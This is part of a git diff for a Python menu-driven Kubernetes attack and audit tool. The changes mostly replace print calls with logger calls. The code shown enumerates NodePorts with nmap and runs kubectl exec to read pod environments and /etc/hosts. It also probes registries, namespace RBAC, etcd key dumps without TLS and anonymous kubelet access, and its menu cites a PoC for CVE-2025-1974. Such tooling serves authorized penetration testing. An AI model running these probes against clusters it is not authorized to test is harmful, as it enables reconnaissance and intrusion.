+    port_forward_proc.terminate()
 
 def nodeport_scanner():
     """List NodePort services and suggest which IP:port to try from outside the cluster."""
-    print('\n[5] NodePort scanner')
+    logger.info("[5] NodePort scanner")
     services = kubectl_json('get svc --all-namespaces')
     if not services:
-        print('  Could not list services.')
+        logger.error("Could not list services.")
         return
 
     nodeports = []
@@ -760,26 +623,24 @@ def nodeport_scanner():
                 nodeports.append((ns, name, p.get('nodePort'), p.get('port'), p.get('protocol')))
 
     if not nodeports:
-        print('  No NodePort services found.')
+        logger.info("No NodePort services found.")
         return
 
-    print('  Found NodePort services:')
+    logger.info("Found NodePort services:")
     for ns, name, nport, port, proto in nodeports:
-        print(f'   - {ns}/{name} nodePort={nport} targetPort={port} proto={proto}')
+        logger.info(f"   - {ns}/{name} nodePort={nport} targetPort={port} proto={proto}")
 
-    # Show nodes' IPs
     nodes = kubectl_json('get nodes')
     if nodes:
         for n in nodes.get('items', []):
             addrs = n.get('status', {}).get('addresses', [])
             ips = [a['address'] for a in addrs if a.get('type') in ('ExternalIP', 'InternalIP')]
-            print(f"  Node {n['metadata']['name']} -> {ips}")
-    print('\nTry <node-ip>:<nodePort> from your testing host if network permits.')
+            logger.info(f"Node {n['metadata']['name']} -> {ips}")
+    logger.info("Try <node-ip>:<nodePort> from your testing host if network permits.")
 
-    # Optional nmap scan for ports 30000-32767 on nodes
     if input('Run nmap scan on ports 30000-32767 for nodes? [y/N]: ').lower().startswith('y'):
         if which("nmap") is None:
-            print("[!] nmap not found. Install nmap to use this feature.")
+            logger.error("nmap not found. Install nmap to use this feature.")
             return
         if nodes:
             for n in nodes.get('items', []):
@@ -787,19 +648,21 @@ def nodeport_scanner():
                 ips = [a['address'] for a in addrs if a.get('type') in ('ExternalIP', 'InternalIP')]
                 if ips:
                     ip = ips[0]
-                    print(f"\nScanning Node {n['metadata']['name']} IP {ip} ports 30000-32767...")
+                    logger.info(f"Scanning Node {n['metadata']['name']} IP {ip} ports 30000-32767...")
                     cp = run(f"nmap -sV -p 30000-32767 {ip}", capture=True)
-                    print(cp.stdout if cp.returncode == 0 else f"[!] Failed: {cp.stderr}")
+                    if cp.returncode == 0:
+                        logger.info(cp.stdout)
+                    else:
+                        logger.error(f"Failed: {cp.stderr}")
         else:
-            print('  No nodes found for scanning.')
-
+            logger.error("No nodes found for scanning.")
 
 def env_info():
     """Gain environment information from a pod: env, /etc/hosts, etc."""
-    print("\n[6] Gaining Environment Information from a pod")
+    logger.info("[6] Gaining Environment Information from a pod")
     pods = kubectl_json("get pods --all-namespaces")
     if not pods:
-        print("  [!] Could not list pods.")
+        logger.error("Could not list pods.")
         return
 
     pod_list = []
@@ -809,22 +672,22 @@ def env_info():
         pod_list.append((ns, name))
 
     if not pod_list:
-        print('  No pods found.')
+        logger.info("No pods found.")
         return
 
-    print(f"  Found {len(pod_list)} pods:")
+    logger.info(f"Found {len(pod_list)} pods:")
     for i, (ns, name) in enumerate(pod_list, 1):
-        print(f"   {i}. {ns}/{name}")
+        logger.info(f"   {i}. {ns}/{name}")
 
-    choice = input("\nChoose a pod index to inspect (or press Enter to cancel): ").strip()
+    choice = input("Choose a pod index to inspect (or press Enter to cancel): ").strip()
     if not choice:
-        print("Cancelled.")
+        logger.info("Cancelled.")
         return
     try:
         idx = int(choice) - 1
         ns, name = pod_list[idx]
-    except Exception:
-        print("Invalid choice")
+    except (ValueError, IndexError):
+        logger.error("Invalid choice")
         return
 
     commands = [
@@ -836,22 +699,21 @@ def env_info():
     ]
 
     for cmd in commands:
-        print(f'\nExecuting: {cmd} in {ns}/{name}')
+        logger.info(f"Executing: {cmd} in {ns}/{name}")
         cp = run(f"kubectl exec -n {ns} {name} -- {cmd}", capture=True)
         if cp.returncode == 0:
-            print(cp.stdout)
+            logger.info(cp.stdout)
         else:
-            print(f'  [!] Failed: {cp.stderr}')
+            logger.error(f"Failed: {cp.stderr}")
 
-    print('\nUse this information for further reconnaissance and attacks.')
-
+    logger.info("Use this information for further reconnaissance and attacks.")
 
 def registry_scanner():
     """Search for registries in the cluster and curl /v2/_catalog to check auth."""
-    print("\n[7] Search for registries in the cluster")
+    logger.info("[7] Search for registries in the cluster")
     services = kubectl_json('get svc --all-namespaces')
     if not services:
-        print('  Could not list services.')
+        logger.error("Could not list services.")
         return
 
     registries = []
@@ -866,59 +728,56 @@ def registry_scanner():
                 registries.append((ns, name, cluster_ip, domain, p.get('port')))
 
     if not registries:
-        print('  No potential registries found (port 5000 or name containing "registry").')
+        logger.info("No potential registries found (port 5000 or name containing 'registry').")
         return
 
-    print(f'  Found {len(registries)} potential registries:')
+    logger.info(f"Found {len(registries)} potential registries:")
     for ns, name, ip, domain, port in registries:
-        print(f'   - {ns}/{name} IP={ip} domain={domain} port={port}')
-        print('    Checking /v2/_catalog...')
+        logger.info(f"   - {ns}/{name} IP={ip} domain={domain} port={port}")
+        logger.info(f"Checking /v2/_catalog for {domain}:{port}...")
         cp = run(f"curl -s -m 5 http://{domain}:{port}/v2/_catalog", capture=True)
         if cp.returncode == 0:
             if 'login' in cp.stdout.lower() or '401' in cp.stdout or '403' in cp.stdout:
-                print('      [!] Authentication required (401/403 or login prompt)')
+                logger.warning("Authentication required (401/403 or login prompt)")
             else:
-                print('      No authentication (200 OK):')
-                print(f'      {cp.stdout[:200]}...')  # Truncate long output
+                logger.success(f"No authentication (200 OK): {cp.stdout[:200]}...")
         else:
-            print(f'      [!] Failed to access: {cp.stderr}')
+            logger.error(f"Failed to access: {cp.stderr}")
 
-    print('\nNote: If HTTPS, try https:// with -k for curl. This checks for auth on registries.')
-
+    logger.info("Note: If HTTPS, try https:// with -k for curl. This checks for auth on registries.")
 
 def ns_bypass():
     """Kubernetes namespaces bypass check: list ns and try access pods in them."""
-    print("\n[8] Kubernetes namespaces bypass check")
+    logger.info("[8] Kubernetes namespaces bypass check")
     ns_list = kubectl_json("get namespaces")
     if not ns_list:
-        print("  [!] Could not list namespaces.")
+        logger.error("Could not list namespaces.")
         return
 
     ns_names = [n['metadata']['name'] for n in ns_list.get('items', [])]
-    print(f"  Found namespaces: {len(ns_names)}")
+    logger.info(f"Found namespaces: {len(ns_names)}")
     for name in ns_names:
-        print(f"\nChecking access to pods in namespace {name}...")
+        logger.info(f"Checking access to pods in namespace {name}...")
         cp = run(f"kubectl get pods -n {name}", capture=True)
         if cp.returncode == 0:
-            print('  Accessible! Pods:')
-            print(cp.stdout)
+            logger.success("Accessible! Pods:")
+            logger.info(cp.stdout)
         else:
-            print('  Not accessible (RBAC restriction?):')
-            print(cp.stderr)
+            logger.warning("Not accessible (RBAC restriction?):")
+            logger.info(cp.stderr)
 
-    print('\nThis checks RBAC permissions for getting pods in each namespace.')
-    print('Note: Even if not accessible via RBAC, network bypass may allow direct IP access to services/pods.')
-
+    logger.info("This checks RBAC permissions for getting pods in each namespace.")
+    logger.info("Note: Even if not accessible via RBAC, network bypass may allow direct IP access to services/pods.")
 
 def core_components_check():
     """Check core components: apiserver flags, etcd no-TLS, kubelet anon access."""
-    print("\n[9] Core components check (apiserver, etcd, kubelet)")
+    logger.info("[9] Core components check (apiserver, etcd, kubelet)")
 
-    # 1. Check kube-apiserver flags (--anonymous-auth, --insecure-port)
-    print("\nChecking kube-apiserver flags (--anonymous-auth, --insecure-port)...")
+    # Check kube-apiserver flags
+    logger.info("Checking kube-apiserver flags (--anonymous-auth, --insecure-port)...")
     apiserver_pods = kubectl_json("get pods -n kube-system -l component=kube-apiserver")
     if not apiserver_pods:
-        print("  [!] Could not find kube-apiserver pods.")
+        logger.error("Could not find kube-apiserver pods.")
     else:
         for p in apiserver_pods.get('items', []):
             name = p['metadata']['name']
@@ -927,63 +786,58 @@ def core_components_check():
                 cmdline = cp.stdout.strip().replace('\x00', ' ')
                 anon_auth = '--anonymous-auth=true' in cmdline
                 insecure_port = '--insecure-port=' in cmdline
-                print(f"  Pod {name}:")
+                logger.info(f"Pod {name}:")
                 if anon_auth:
-                    print("    [!] --anonymous-auth=true (anonymous access enabled)")
+                    logger.warning("--anonymous-auth=true (anonymous access enabled)")
                 else:
-                    print("    --anonymous-auth=false (ok)")
+                    logger.success("--anonymous-auth=false (ok)")
                 if insecure_port:
-                    print("    [!] --insecure-port enabled (insecure HTTP port)")
+                    logger.warning("--insecure-port enabled (insecure HTTP port)")
                 else:
-                    print("    --insecure-port not enabled (ok)")
+                    logger.success("--insecure-port not enabled (ok)")
             else:
-                print(f"  [!] Failed to get cmdline for {name}: {cp.stderr}")
+                logger.error(f"Failed to get cmdline for {name}: {cp.stderr}")
 
-    # 2. Check etcd (access without TLS)
-    print("\nChecking etcd access without TLS (port 2379)...")
+    # Check etcd
+    logger.info("Checking etcd access without TLS (port 2379)...")
     etcd_pods = kubectl_json("get pods -n kube-system -l component=etcd")
     if not etcd_pods:
-        print("  [!] Could not find etcd pods.")
+        logger.error("Could not find etcd pods.")
     else:
         for p in etcd_pods.get('items', []):
             name = p['metadata']['name']
             node_name = p['spec']['nodeName']
-            # Get node IP
             node = kubectl_json(f"get node {node_name}")
             if node:
                 addrs = node.get('status', {}).get('addresses', [])
                 ips = [a['address'] for a in addrs if a.get('type') == 'InternalIP']
                 if ips:
                     etcd_ip = ips[0]
-                    print(f"  Trying curl on etcd at {etcd_ip}:2379/version...")
+                    logger.info(f"Trying curl on etcd at {etcd_ip}:2379/version...")
                     cp = run(f"curl -m 5 http://{etcd_ip}:2379/version", capture=True)
                     if cp.returncode == 0:
-                        print(f"    [!] Accessible without TLS: {cp.stdout}")
+                        logger.warning(f"Accessible without TLS: {cp.stdout}")
                     else:
-                        print("    Not accessible without TLS (ok or requires TLS/auth)")
+                        logger.success("Not accessible without TLS (ok or requires TLS/auth)")
+                    if which("etcdctl"):
+                        logger.info("Checking etcd access with etcdctl (read all keys)...")
+                        cp = run(f"etcdctl --endpoints=http://{etcd_ip}:2379 get / --prefix --keys-only", capture=True)
+                        if cp.returncode == 0:
+                            logger.warning(f"Accessible without auth/TLS: {cp.stdout[:200]}...")
+                        else:
+                            logger.success(f"Not accessible (ok): {cp.stderr}")
+                    else:
+                        logger.warning("etcdctl not found. Skip etcdctl check.")
                 else:
-                    print(f"  [!] No InternalIP for node {node_name}")
+                    logger.error(f"No InternalIP for node {node_name}")
             else:
-                print(f"  [!] Could not get node {node_name}")
+                logger.error(f"Could not get node {node_name}")
 
-    # Optional etcdctl check for etcd access
-    if which("etcdctl") is not None:
-        print("\nChecking etcd access with etcdctl (read all keys)...")
-        etcd_endpoints = f"{etcd_ip}:2379"  # Use the first etcd IP
-        cp = run(f"etcdctl --endpoints=http://{etcd_endpoints} get / --prefix --keys-only", capture=True)
-        if cp.returncode == 0:
-            print(f"    [!] Accessible without auth/TLS: {cp.stdout[:200]}...")
-        else:
-            print("    Not accessible (ok):")
-            print(cp.stderr)
-    else:
-        print("\n[!] etcdctl not found. Skip etcdctl check.")
-
-    # 3. Check kubelet (anonymous access via 10250 port)
-    print("\nChecking kubelet anonymous access (port 10250)...")
+    # Check kubelet
+    logger.info("Checking kubelet anonymous access (port 10250)...")
     nodes = kubectl_json("get nodes")
     if not nodes:
-        print("  [!] Could not get nodes.")
+        logger.error("Could not get nodes.")
     else:
         for n in nodes.get('items', []):
             name = n['metadata']['name']
@@ -991,33 +845,31 @@ def core_components_check():
             ips = [a['address'] for a in addrs if a.get('type') == 'InternalIP']
             if ips:
                 kubelet_ip = ips[0]
-                print(f"  Trying anonymous access to kubelet at {kubelet_ip}:10250/pods...")
+                logger.info(f"Trying anonymous access to kubelet at {kubelet_ip}:10250/pods...")
                 cp = run(f"curl -k -m 5 https://{kubelet_ip}:10250/pods", capture=True)
                 if cp.returncode == 0 and 'Unauthorized' not in cp.stdout:
-                    print(f"    [!] Anonymous access allowed: Returns pods info")
+                    logger.warning("Anonymous access allowed: Returns pods info")
                 else:
-                    print("    Anonymous access denied (ok)")
+                    logger.success("Anonymous access denied (ok)")
             else:
-                print(f"  [!] No InternalIP for node {name}")
+                logger.error(f"No InternalIP for node {name}")
 
-    print('\nCore components check complete. Review for vulnerabilities.')
-
+    logger.info("Core components check complete. Review for vulnerabilities.")
 
 def spawn_shell():
     """Spawn a shell and return to menu after exit."""
-    print("\n[10] Spawning shell. Type 'exit' to return to menu.")
+    logger.info("[10] Spawning shell. Type 'exit' to return to menu.")
     subprocess.run("/bin/bash", shell=True)
-    print("\nReturned to menu.")
-
+    logger.info("Returned to menu.")
 
 # ---------------------
-# Command registry - add your functions here
+# Command registry
 # ---------------------
 COMMANDS = [
     ("pod2node", "Generate privileged pod YAML and inspect nodes/pods", pod2node_interactive),
     ("privscan", "Scan for privileged containers (enumeration only)", privileged_containers_scan),
     ("rbac", "RBAC token scanner - check SA tokens for dangerous perms", rbac_token_checker),
-    ("ingress", "Check ingress controller images/versions and craft safe Ingress with annotations", ingress_checker),
+    ("ingress", "Check ingress controller images/versions and craft Ingress with PoC for CVE-2025-1974", ingress_checker),
     ("nodeport", "List NodePort services and node IP hints", nodeport_scanner),
     ("envinfo", "Gain environment information from a pod (env, hosts, etc.)", env_info),
     ("registryscan", "Search for registries in the cluster and suggest curling them", registry_scanner),
@@ -1026,31 +878,27 @@ COMMANDS = [
     ("shell", "Spawn a shell and return to menu", spawn_shell),
 ]
 
-
 def print_menu():
-    print('Available commands:')
+    logger.info("Available commands:")
     for i, (key, desc, _) in enumerate(COMMANDS, 1):
-        print(f'  {i}. {key:<10} - {desc}')
-    print('\n  q. quit')
-
+        logger.info(f"  {i}. {key:<10} - {desc}")
+    logger.info("  q. quit")
 
 def main():
     global BANNER_SHOWN
     check_prereqs()
-    # Show banner only on first entry to main() in this session
     if not BANNER_SHOWN:
-        print(BANNER)
+        logger.info(BANNER)
         BANNER_SHOWN = True
     
     while True:
         print_menu()
-        choice = input('\nSelect an option (number or command): ').strip()
+        choice = input('Select an option (number or command): ').strip()
         if not choice:
             continue
         if choice.lower() in ('q', 'quit', 'exit'):
-            print('bye')
+            logger.info("bye")
             break
-        # allow number or name
         func = None
         if choice.isdigit():
             idx = int(choice) - 1
@@ -1062,15 +910,14 @@ def main():
                     func = f
                     break
         if func is None:
-            print('Invalid choice. Pick a number or command name.')
+            logger.error("Invalid choice. Pick a number or command name.")
             continue
         try:
             func()
         except KeyboardInterrupt:
-            print('\nInterrupted, returning to menu.')
+            logger.info("Interrupted, returning to menu.")
         except Exception as e:
-            print(f'Error in command: {e}')
-
+            logger.error(f"Error in command: {e}")
 
 if __name__ == '__main__':
     main()
